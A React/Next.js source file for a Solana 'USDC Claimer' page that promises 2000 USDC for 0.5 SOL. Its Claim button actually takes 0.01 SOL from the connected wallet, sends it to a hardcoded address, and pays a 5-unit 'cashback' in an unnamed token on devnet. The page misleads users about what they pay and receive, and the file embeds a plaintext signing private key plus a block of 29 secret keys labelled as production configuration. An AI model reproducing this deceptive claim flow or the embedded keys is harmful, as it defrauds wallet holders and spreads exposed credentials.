/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4bKgjdyP3LaqYMJJDCGu1ofDcPGmv6Qk4jGq5qAXHQSHExzYxSZoRZfxVEeFygqy4iN3LpBVZPteDctTVURJakXA"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "57tTyqndp6aPxA4YBpv13qboqDJtJkZwKdCDCnR5BXtvstamFbPkNvgoFuD8ZGuA9FNSiQQL7TgPjyDbXYHPQ9nP",
  "key1": "3gRJWjnkfqk6D5zQSnzYJSmM7wGEXxMUhit9PSY7zMty7q9WcCS5oxpqimXvg3PjcRXBxy2cpyQH3BWB7Yd6M8ok",
  "key2": "5JS4NsAnWLy4tbM7Vpvqg6suvSCNek645HNMT4KTsS8rkbmJDuohVctFzKHHSyLQNGkBBaNxqVQCDAyFH6ypY92M",
  "key3": "2hQvT1SNooBMmvmAwp3FXVTEgRqTwyAdMzWzG1opUwWT7YL7pyBJEZaLuwi7jvLb47akTQRa8pcE9E6V3na31W2o",
  "key4": "3GXXEncLwT14SS2an3AeXaQAmVG12DrDxstKzUcvUCfkHC3epS13XxLfjXtVGzevUwZsVgnN5YDnzS1amqiWoigK",
  "key5": "3YAbBE41HxkgvWitq1hMTRhkvtouFB2H8hyRceRLJwThv4YDMN3oJZM1smK2b6E3BmmgBbnDbWosoRWgYxuzj8XS",
  "key6": "2HnteZAbN8h9CGriXwxfXk1d77EwUmjwUEyYumP2Tk3HxWD5cwU92fYfcURas1gXefrtncyoRuuxuN3C9RgZ4HMa",
  "key7": "67Dr2MgBPWjJpQkGQFJGmVkABnhohH8gPLwZud857MuKvjJUXzkBxMvHwzvHMS9zkNAdhYZdgo2qdGFKxgCjsvxx",
  "key8": "5KVaCowgLWQFES5rh5rdjYGbBGBRgCfXUjp7q8x3rnoYB82Pd33VqhaTdChUHtMZanXWVK82ppTGGA6rNVzfLLok",
  "key9": "62tzS684EtmavFkFJQaq5zeN7E6repRpYwAJBQrRBMZDVqzkLvrUkTZbniWeZWaedLscTDLT9Q8TpFXx5yTL2UwZ",
  "key10": "4wPu3FXF3VEi9fMaPE8wxqN7fsXeFeVEUhxsfYxZzVQTi9kKNypd4xmYiv8YNZG2CXDfxSACgioqU1ZasoUST25T",
  "key11": "5yz5pmAEqJXdc37yEkryr45UXYp5PgsN6q1DnuhomfZcrA9vHdg1x3RKFF19bMM6cFo31AGSPeQd8jBayW3abbD5",
  "key12": "5rs1aoQqCoJGV5pp881RWiKhyZek5FqTRAhd27MG3BxQtvqqhqYyLUAFpFRyyZYGTqYHTWpfcfuUKgEdh93f4teW",
  "key13": "JxtMjayJhZpTEYQ5BSFLAmo6gm399Ccx6mXFqZ4svHQVeFWWAXd2bMazQWiccFRTJk8roesB4cd4r1MpHi75JRz",
  "key14": "5yCT9igG2mv1UqMqiuMSHXxfCaKSwRk7D8ajBLRVfNGnBHMtAzN23vVTZiCHhxjXxcwFdbpix7QYbsWSNgiNY9KN",
  "key15": "z1ib3qh93XzLqiqaUrhMRx6mRrDcL7R6xinJtY8S84gzYTvU961VeYkSDt34u4sBsWvu4xKyjpre634vV1rCLTz",
  "key16": "51FdFZCxetekfDGTdKk2tbGXBhq7LLtvFs1NV6Ls1DGSEhu5GdLQB1wpVGmbBNbYWDKjpT9hpLqnDwVxMB33iJJW",
  "key17": "cfmUNidkxtB9PjjLCxwZDrxjxyZRY5W12hK74gWRX9sUTQrbd38C7RsAaMN2Ph8xuQkLAjgLQLVgWNgPPnhCpaz",
  "key18": "5dAearvkZGwj8cbNbjjsPDtr3mCYd8Fe1xRS2DUWwpMcgHhLh8zNAZzMYQWv9Q7oMvTsH6LuS34Z1QMjJx3nwqqo",
  "key19": "NeQhVdKbNCHkNuTo5Sibn3TRefqtwgt3P8nCbMuxxBAMNxPEDxu5XGireWfyjWNX3rRQ58nSW3uKREm817g9KTT",
  "key20": "47gdVyTtoEpWYV4xff91GvxVWXCP3A2SSMAfMWpcb379XbuWePLMU9cS6ebMRxhFsLLKTrxgg8sARnCUzAcsM97i",
  "key21": "2h6WEWFFKANuPH3BvZstYH42e5HzWTfxtxQ9cZ9pWW8HagW6gY5nnnueoxX6dnemddxUR7sBnmtmdyPdxQiXxJfG",
  "key22": "ZFLJ6tgB1v24P2AruQQ57vjdS2NpyvRnoc4feiQLU9Qqh2rfnSmiAvrHX7kf3H68JRbKNE5G4Lzw87dt46e6Ldr",
  "key23": "2rTtQKwRL6eqwXk6JQhH2AtA7gzqyvgquEBiFr69jLvnukSHGeqxBM8sdp7oZVVwtoGgNuYKAjkXp5Mrs6krdfaH",
  "key24": "5yrJfktkHaKgiDmREydiUPUGfgB427HGjUwrTbxnTyAgaMtGcbzHu8zVhPthGd7ARVozFXP7iw3PjEjFgtgp6ST6",
  "key25": "5uCNs2n8f1fgwkcKQWJ9JvmDdu1UypzXEWKb279pxzdKLqcwiNmV51F2z7MsKJVn4ZPE5uNaQMyYZNJZhcUErxTP",
  "key26": "2KZcXj8y96BcGMeghueaj2BytnU5dQLNUwgY8gh2m7NCbYamWjwoAVs1p1Jsxv7Yk4W1ve2Z1ojcYPXhuzU8KBCP",
  "key27": "3e8vxVHzf4YLGCdK6CMS2TYCBnNpUZzPZDcekdu2xDsvhpcmc6c8G8m6AWDnh9iev3MeyJ63FxEfyjYqaYdpQWV6",
  "key28": "39zEa96Dad2SkYmUyn94uGR4HdtjUTAZsVbKC92De1byhps8zweAeoz8onijvoUbH6rpb4xSfoeNFC47VrWefMoQ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
